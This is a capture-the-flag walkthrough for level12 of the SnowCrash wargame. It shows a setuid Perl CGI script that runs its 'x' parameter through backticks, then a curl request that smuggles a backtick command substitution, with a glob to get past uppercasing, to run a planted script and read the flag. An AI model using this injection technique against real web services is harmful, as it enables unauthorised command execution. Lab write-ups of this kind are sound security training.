## level12
```
level11@SnowCrash:~$ su level12
Password: fa6v5ateaw21peobuub8ipe6s
level12@SnowCrash:~$
```
```
level12@SnowCrash:~$ ll
total 16
dr-xr-x---+ 1 level12 level12  120 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout*
-r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc*
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl*
-r-x------  1 level12 level12  675 Apr  3  2012 .profile*
```
```
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```
```
nc localhost 4646
test
..level12
```
```
level12@SnowCrash:~$ echo 'getflag > /tmp/flag' > /tmp/EXPLOIT
level12@SnowCrash:~$ curl localhost:4646/?x='`/*/EXPLOIT`'
..level12@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```
